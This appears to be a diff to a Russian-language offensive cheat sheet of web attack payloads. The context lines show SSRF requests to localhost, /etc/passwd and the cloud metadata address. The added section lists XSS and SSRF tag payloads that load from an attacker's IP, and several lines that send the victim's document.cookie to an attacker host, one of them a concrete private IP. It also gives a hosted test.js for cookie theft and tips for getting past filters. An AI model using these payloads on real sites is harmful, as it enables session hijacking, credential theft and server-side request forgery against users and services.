@@ -45,3 +45,69 @@ GET /share?url=http://localhost/admin
 GET /preview?link=file:///etc/passwd
 POST /og-image
 data: target=http://169.254.169.254/latest/meta-data/
+
+---
+
+
+## 💥 ПЕЙЛОАДЫ ДЛЯ ФОРМ
+
+
+
+### 🧪 ДРУГИЕ ТЕГИ ДЛЯ ОБХОДА (если `script` не работает)
+
+```html
+<iframe src="http://YOUR_IP:8888/exploit"></iframe>
+```
+```html
+<object data="http://YOUR_IP:8888/exploit"></object>
+```
+```html
+<link rel="import" href="http://YOUR_IP:8888/exploit">
+```
+```html
+<embed src="http://YOUR_IP:8888/exploit">
+```
+
+### 🎨 ЧЕРЕЗ CSS (если можно загрузить свою тему)
+```css
+body { background: url('http://YOUR_IP:8888/ssrf-test'); }
+```
+
+### 🔁 ЧЕРЕЗ META-ТЕГ (редко, но работает)
+```html
+<meta http-equiv="refresh" content="0; url=http://YOUR_IP:8888/ssrf-test">
+```
+
+### 🧠 ЧЕРЕЗ ONERROR (когда есть тег img)
+```html
+<img src=x onerror="fetch('http://YOUR_IP:8888/steal?c='+document.cookie)">
+<img src=x onerror="new Image().src='http://192.168.187.139:8888/?c='+document.cookie">
+
+```
+
+### 📦 ЧЕРЕЗ FETCH ВНУТРИ SCRIPT (если инлайн-скрипты не режут)
+```html
+<script>fetch('http://YOUR_IP:8888/steal?c='+document.cookie)</script>
+```
+
+### 🧨 УНИВЕРСАЛЬНЫЙ ТЕСТ — ЗАГРУЗКА ВНЕШНЕГО РЕСУРСА
+Любым способом заставь браузер жертвы сходить на твой IP:
+```html
+<script src="http://YOUR_IP:8888/test.js"></script>
+Файл `test.js` на твоём сервере:
+fetch('http://YOUR_IP:4444/steal?c='+document.cookie);
+или test.html
+<script>
+fetch("http://192.168.187.139:8885/steal?c=" + document.cookie, {mode: 'no-cors'});
+</script>
+
+<img src="http://YOUR_IP:8888/test.jpg">
+<link rel="stylesheet" href="http://YOUR_IP:8888/test.css">
+```
+
+Если хоть один запрос пришёл на твой сервер — значит, можно выполнить код.
+
+---
+
+### 🧠 ПОЧЕМУ ЭТО ВАЖНО
+Иногда фильтр режет `fetch`, `XMLHttpRequest`, `onerror`, но пропускает `src`, `href` или `data`. В таких случаях внешний скрипт — единственный способ заставить браузер выполнить твой код.
